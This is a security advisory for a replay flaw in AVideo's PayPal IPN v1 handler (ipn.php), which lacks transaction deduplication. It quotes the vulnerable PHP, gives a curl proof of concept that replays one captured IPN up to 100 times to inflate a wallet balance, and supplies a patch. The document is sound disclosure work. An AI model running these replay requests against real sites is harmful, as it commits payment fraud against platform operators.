# [M] WWBN AVideo Affected by a PayPal IPN Replay Attack Enabling Wallet Balance Inflation via Missing Transaction Deduplication in ipn.php

## Summary
Severity: Medium
Advisory: GHSA-mmw7-wq3c-wf9p
CVE: CVE-2026-39366
CWE: CWE-345
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-mmw7-wq3c-wf9p
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The PayPal IPN v1 handler at `plugin/PayPalYPT/ipn.php` lacks transaction deduplication, allowing an attacker to replay a single legitimate IPN notification to repeatedly inflate their wallet balance and renew subscriptions. The newer `ipnV2.php` and `webhook.php` handlers correctly deduplicate via `PayPalYPT_log` entries, but the v1 handler was never updated and remains actively referenced as the `notify_url` for billing plans.

## Details

When a recurring payment IPN arrives at `ipn.php`, the handler:

1. Verifies authenticity via `PayPalYPT::IPNcheck()` (line 16), which sends the POST data to PayPal's `cmd=_notify-validate` endpoint. PayPal confirms the data is genuine but this verification is **stateless** — PayPal returns `VERIFIED` for the same authentic data on every submission.

2. Looks up the subscription from `recurring_payment_id` and directly credits the user's wallet (lines 41-53):

```php
// plugin/PayPalYPT/ipn.php lines 41-53
$row = Subscription::getFromAgreement($_POST["recurring_payment_id"]);
$users_id = $row['users_id'];
$payment_amount = empty($_POST['mc_gross']) ? $_POST['amount'] : $_POST['mc_gross'];
$payment_currency = empty($_POST['mc_currency']) ? $_POST['currency_code'] : $_POST['mc_currency'];
if ($walletObject->currency===$payment_currency) {
    $plugin->addBalance($users_id, $payment_amount, "Paypal recurrent", json_encode($_POST));
    Subscription::renew($users_id, $row['subscriptions_plans_id']);
    $obj->error = false;
}
```

No `txn_id` uniqueness check. No `PayPalYPT_log` entry created. No deduplication of any kind.

Compare with the patched handlers:
- **`ipnV2.php`** (line 50): `PayPalYPT::isTokenUsed($_GET['token'])` and (line 93): `PayPalYPT::isRecurringPaymentIdUsed($_POST["verify_sign"])`, with `PayPalYPT_log` entries saved on success.
- **`webhook.php`** (line 30): `PayPalYPT::isTokenUsed($token)` with `PayPalYPT_log` entry saved on success.

The v1 `ipn.php` is still actively configured as `notify_url` in `PayPalYPT.php` at lines 85, 193, and 308:
```php
$notify_url = "{$global['webSiteRootURL']}plugin/PayPalYPT/ipn.php";
```

## PoC

```bash
# Prerequisites: A registered AVideo account with at least one completed PayPal subscription.

# Step 1: Complete a legitimate PayPal subscription.
# This generates an IPN notification to ipn.php containing your recurring_payment_id.

# Step 2: Capture the IPN POST body. This is available from:
# - PayPal's IPN History (paypal.com > Settings > IPN History)
# - Network interception during the initial subscription flow

# Step 3: Replay the captured IPN to inflate wallet balance.
# Each replay adds the subscription amount to the attacker's wallet.

# Single replay:
curl -X POST 'https://target.com/plugin/PayPalYPT/ipn.php' \
  -d 'recurring_payment_id=I-XXXXXXXXXX&mc_gross=9.99&mc_currency=USD&payment_status=Completed&txn_type=recurring_payment&verify_sign=REAL_VERIFY_SIGN&payer_email=attacker@example.com'

# Bulk replay (100x = 100x the subscription amount added to wallet):
for i in $(seq 1 100); do
  curl -s -X POST 'https://target.com/plugin/PayPalYPT/ipn.php' \
    -d 'recurring_payment_id=I-XXXXXXXXXX&mc_gross=9.99&mc_currency=USD&payment_status=Completed&txn_type=recurring_payment&verify_sign=REAL_VERIFY_SIGN&payer_email=attacker@example.com'
done

# Each request passes IPNcheck() (PayPal confirms the data is authentic),
# then addBalance() credits the wallet and Subscription::renew() extends the subscription.
```

## Impact

- **Unlimited wallet balance inflation**: An attacker can replay a single legitimate IPN to add arbitrary multiples of the subscription amount to their wallet balance, enabling free access to all paid content.
- **Unlimited subscription renewals**: Each replay also calls `Subscription::renew()`, indefinitely extending subscription access from a single payment.
- **Financial loss**: Platform operators lose revenue as attackers obtain paid services without corresponding payments.

## Recommended Fix

Add deduplication to `ipn.php` consistent with the approach already used in `ipnV2.php` and `webhook.php`. Record each processed transaction in `PayPalYPT_log` and check before processing:

```php
// plugin/PayPalYPT/ipn.php — replace lines 41-57 with:
} else {
    _error_log("PayPalIPN: recurring_payment_id = {$_POST["recurring_payment_id"]} ");

    // Deduplication: check if this IPN was already processed
    $dedup_key = !empty($_POST['txn_id']) ? $_POST['txn_id'] : $_POST['verify_sign'];
    if (PayPalYPT::isRecurringPaymentIdUsed($dedup_key)) {
        _error_log("PayPalIPN: already processed, skipping");
        die(json_encode($obj));
    }

    $subscription = AVideoPlugin::loadPluginIfEnabled("Subscription");
    if (!empty($subscription)) {
        $row = Subscription::getFromAgreement($_POST["recurring_payment_id"]);
        _error_log("PayPalIPN: user found from recurring_payment_id (users_id = {$row['users_id']}) ");
        $users_id = $row['users_id'];
        $payment_amount = empty($_POST['mc_gross']) ? $_POST['amount'] : $_POST['mc_gross'];
        $payment_currency = empty($_POST['mc_currency']) ? $_POST['currency_code'] : $_POST['mc_currency'];
        if ($walletObject->currency===$payment_currency) {
            // Log the transaction for deduplication
            $pp = new PayPalYPT_log(0);
            $pp->setUsers_id($users_id);
            $pp->setRecurring_payment_id($dedup_key);
            $pp->setValue($payment_amount);
            $pp->setJson(['post' => $_POST]);
            if ($pp->save()) {
                $plugin->addBalance($users_id, $payment_amount, "Paypal recurrent", json_encode($_POST));
                Subscription::renew($users_id, $row['subscriptions_plans_id']);
                $obj->error = false;
            }
        } else {
            _error_log("PayPalIPN: FAIL currency check $walletObject->currency===$payment_currency ");
        }
    }
}
```

Additionally, consider migrating the `notify_url` references in `PayPalYPT.php` (lines 85, 193, 308) from `ipn.php` to `ipnV2.php` or `webhook.php`, and eventually deprecating the v1 IPN handler entirely.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-mmw7-wq3c-wf9p
- https://nvd.nist.gov/vuln/detail/CVE-2026-39366
- https://github.com/WWBN/AVideo/commit/8f53e9d9c6aaa07d51ace30691981edbbfb5ca1c
- https://github.com/WWBN/AVideo
